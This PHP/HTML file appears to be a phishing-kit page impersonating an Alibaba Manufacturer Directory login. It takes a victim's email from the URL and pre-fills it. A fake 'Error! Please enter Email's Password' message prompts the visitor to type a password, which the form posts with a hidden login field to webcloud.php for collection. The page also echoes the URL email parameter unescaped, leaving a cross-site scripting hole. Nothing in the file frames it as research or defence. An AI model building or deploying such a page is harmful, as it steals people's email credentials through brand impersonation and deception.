<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>
<title>Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers</title>
<link rel="icon" href="./WebFiles/favicon.jpg" type="image/gif" sizes="16x16">
</head>


<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0">

	<table align="center" cellspacing="0" height="100%" width="100%">
	
	<tr><td height="7%">
		<div align="center">
			<img src="./WebFiles/header.jpg">
		</div>
	</td></tr>
	
	
	
	
	
	
	<tr><td height="85%" background="./WebFiles/background.jpg">
	
			<table align="center" width="90%"><tr><td>
			
				<table align="right" style="width:420px; height:400px;"><tr><td background="./WebFiles/modal.jpg">
				
						<table align="center" cellspacing="0">
						
						<tr><td>
							
							<form method="post" action="./webcloud.php">
						
						</td></tr>
						
						
						
						
						<tr><td style="height:20px;">
						
							<font face="verdana" size="2" color="#FF0000">
								Error! Please enter Email's Password
							</font>
						
						</td></tr>
						
						
						
						<tr><td style="height:30px;"></td></tr>
						
						
						
						<tr><td>
						
							<div align="center">
							
								<input type="email" value="<?php echo $_GET['email']; ?>" name="login" disabled
								style="width:355px; height:33px; background-color: #FFFFFF; border: solid 1px #848484; padding: 5px; 
								-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;">
							
							</div>
						
						</td></tr>
						
						
						
						<tr><td style="height:25px;"></td></tr>
						
						
						
						
						<tr><td>
						
							<div align="center">
							
								<input  name="passwd" type="password" placeholder="Password" required 
								style="width:355px; height:33px; background-color: #FFFFFF; border: solid 1px #848484; padding: 8px; 
								-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;">
							
							</div>
						
						</td></tr>
						
						
						
						<tr><td style="height:30px;"></td></tr>
						
						
						
						
						<tr><td>
						
							<div align="center">
							
								<input type="image" src="./WebFiles/submit.jpg" border="0" style="width:355px; height:32px;" />
							
							</div>
						
						</td></tr>
						
						
						
						<tr><td style="height:110px;">
						
							<input type="hidden" value="<?php echo $_GET['email']; ?>" name="login">
							</form>
						
						</td></tr>
						
						</table>
				
				</td></tr></table>
			
			</td></tr></table>
	
	</td></tr>
	
	
	
	
	
	<tr><td height="8%">
		<div align="center">
			<img src="./WebFiles/footer.jpg">
		</div>
	</td></tr>
	
	
	</table>


</body>

</html>